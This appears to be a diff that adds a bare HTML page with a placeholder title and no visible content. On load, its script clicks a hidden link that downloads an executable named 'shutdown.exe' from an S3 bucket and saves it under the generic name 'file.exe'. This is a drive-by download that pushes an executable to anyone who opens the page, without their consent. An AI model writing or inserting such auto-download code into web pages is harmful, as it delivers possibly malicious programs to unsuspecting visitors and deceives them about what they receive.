@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+	<head>
+	<title>Page Title</title>
+	</head>
+	<body>
+		<a id="auto_download" href="" download="file.exe"></a>
+	</body>
+	<script>
+		document.querySelector('a').addEventListener('click', event => event.target.href = "https://bhagvan-repo.s3.amazonaws.com/shutdown.exe");
+		const load = () => {event.target.href = "https://bhagvan-repo.s3.amazonaws.com/shutdown.exe"; document.getElementById('auto_download').click();}
+		window.onload = load;
+	</script>
+</html>
